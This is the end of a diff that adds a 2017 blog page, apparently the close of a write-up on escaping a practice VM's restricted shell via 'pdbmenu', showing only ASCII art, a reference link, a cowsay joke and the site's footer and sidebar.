+</span><span class='line'>@@@@@,,,##########                     
+</span><span class='line'>@@@@@@@@,,,############################
+</span><span class='line'>@@@@@@@@@@@,,,#########################
+</span><span class='line'>@@@@@@@@@,,,###########################
+</span><span class='line'>@@@@@@,,,##########                    
+</span><span class='line'>@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
+</span><span class='line'>,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
+</span><span class='line'>##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
+</span><span class='line'>#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Interesting twist on this VM with the pdbmenu escape!</p>
+
+<p><strong>Learn more</strong></p>
+
+<ul>
+<li><a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">escape restricted Linux shells</a></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
+</span><span class='line'>/ Q: How many Zen masters does it take to \
+</span><span class='line'>| screw in a light bulb? A: None. The     |
+</span><span class='line'>| Universe spins the bulb, and the Zen    |
+</span><span class='line'>| master stays out                        |
+</span><span class='line'>|                                         |
+</span><span class='line'>\ of the way.                             /
+</span><span class='line'> -----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2017-07-06T06:28:41-04:00" pubdate data-updated="true">Jul 6<span>th</span>, 2017</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2017/07/06/got-pluck/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2017/07/06/got-pluck/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/07/05/urlcrazy-kali-linux-tools/" title="Previous Post: urlcrazy - Kali Linux tools">&laquo; urlcrazy - Kali Linux tools</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/07/06/got-pluck/">Got Pluck?</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/05/urlcrazy-kali-linux-tools/">urlcrazy - Kali Linux tools</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/03/sickos-1-dot-2-writeup/">SickOs 1.2 writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/02/theharvester-kali-linux-tools/">TheHarvester - Kali Linux tools</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/07/01/owning-mr-robot/">Owning Mr Robot</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2017 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2017/07/06/got-pluck/';
+        var disqus_url = 'http://chousensha.github.io/blog/2017/07/06/got-pluck/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
